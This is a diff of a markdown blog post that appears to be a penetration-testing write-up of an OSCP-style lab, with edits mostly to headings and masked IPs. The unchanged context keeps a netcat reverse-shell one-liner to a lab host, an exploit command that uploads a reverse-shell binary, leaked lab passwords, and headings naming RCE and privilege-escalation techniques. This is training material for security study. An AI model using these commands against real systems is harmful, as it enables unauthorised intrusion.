@@ -6,7 +6,7 @@ ShowToc: true
 TocOpen: true
 tags:
   - blog
-lastmod: 2026-01-07T08:10:56.086Z
+lastmod: 2026-01-07T08:33:12.755Z
 ---
 # Box Info
 
@@ -130,9 +130,7 @@ Nmap done: 1 IP address (1 host up) scanned in 175.04 seconds
 
 ```
 
-### DC01
-
-#### SSH 22
+### DC01 SSH 22
 
 Base on the given credit to login the MS01 by eric.wallows, but cant find any way to privilege enumeration , so will check more information in other ports
 
@@ -151,7 +149,7 @@ Microsoft Windows [Version 10.0.19044.2251]
 oscp\eric.wallows@MS01 C:\Users\eric.wallows>  
 ```
 
-#### Web 8000 Freedom1 to administrator
+### Web 8000 Freedom1 to administrator (Database leak)
 
 After brute force the website 8000 , found the backup database `http://192.168.132.153:8000/Partner/Db` , and got the something like the password hashed
 
@@ -164,6 +162,8 @@ ssh support@192.168.132.153
 
 Freedom1
 ```
+
+### Reverse software leak data
 
 After login , found the .exe `admintool.exe` which is likely directly to execute the admin command by support ,but it require to the password , if the password is falied , it will show the hash? ,so i checked the hash , and i think it will be the password of `December31`
 
@@ -194,7 +194,7 @@ December31
 
 ![Pasted image 20251229211549.png](/ob/Pasted%20image%2020251229211549.png)
 
-### MS01
+### MS01 sensitive data PS History File leak
 
 > DC01 is a jump host , so need to config the proxy , like use the ligolo these tools to connect the MS01 host
 
@@ -237,9 +237,7 @@ The history file of the `ConsoleHost_history.txt` can be found the password of `
 
 ![Pasted image 20251229235732.png](/ob/Pasted%20image%2020251229235732.png)
 
-### MS02
-
-#### Administrator to tom\_admin
+### MS02 Administrator to tom\_admin (backup file windows.old sensitive data)
 
 > use the --local-auth to login the local account
 
@@ -629,9 +627,7 @@ help
 220 oscp.exam ESMTP Exim 4.90_1 Ubuntu Fri, 02 Jan 2026 00:29:42 -0500
 ```
 
-***
-
-### Web Recon 192.168.132.156 80🪲
+### Web Recon 80🪲
 
 ### WebSite Directory BurteForce
 
@@ -670,7 +666,7 @@ Try to login the database of phpadmin by `jack`: `3PUKsX98BMupBiCf`, but failed
 
 ***
 
-### Web Recon 192.168.132.156 8080🪲
+### Web Recon  8080🪲
 
 The web 8080 is seem like the nginx proxy 80 proxy ,
 
@@ -678,7 +674,7 @@ The web 8080 is seem like the nginx proxy 80 proxy ,
 
 ***
 
-### Web Recon 192.168.132.156 8083 jack to root
+### Web Recon  8083 jack to root (vesta-rce-exploit)
 
 login as by jack : 3PUKsX98BMupBiCf
 
@@ -761,7 +757,7 @@ root@oscp:~#
 
 ***
 
-# Box Info 192.168.151.157
+# Box Info 192.168.X.157
 
 ### ALL  Information Gathering/NMAP
 
@@ -990,7 +986,7 @@ robert
 
 ***
 
-### Web Recon 192.168.151.157 20000 cassie to root
+### Web Recon 20000 To Cassie (cve-2024-44762 usermin rce)
 
 we can login in by cassie:cassie
 
@@ -1089,6 +1085,8 @@ sh-5.1$ ls
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.203 21 >/tmp/f
 
 ```
+
+### cassie to root (Cron tar Wild Privilege Escalation)
 
 cron show something should not by here
 
@@ -1240,11 +1238,11 @@ Nmap done: 1 IP address (1 host up) scanned in 2.86 seconds
 ```
 ```
 
-### Web Recon 192.168.151.155
+### Web Recon 80
 
 ![Pasted image 20260106155231.png](/ob/Pasted%20image%2020260106155231.png)
 
-### Web Recon 192.168.151.155  9099
+### Web Recon   9099
 
 ![Pasted image 20260106155152.png](/ob/Pasted%20image%2020260106155152.png)
 
@@ -1278,7 +1276,7 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 [###########] - 2m     30000/30000   275/s   http://192.168.126.155:9099/                                                                                                                       
 ```
 
-### Web To Tom  (192.168.X.155)
+### Web To Tom  (Mobile Mouse Server RCE)
 
 ```shell
 whatweb http://192.168.126.155:9099/                                                                      
@@ -1374,7 +1372,7 @@ uv run exploit.py --target 192.168.126.155  --file   ./rev80.exe --lhost 192.168
 
 ![Pasted image 20260106163407.png](/ob/Pasted%20image%2020260106163407.png)
 
-### Tom to Admin (192.168.X.155)
+### Tom to Admin (GPGService.exe Local Privilege Escalation)
 
 After login as Tom, use the winpeas.exe to check the file , and found the MilleGPG5 is easy to be attacked
 
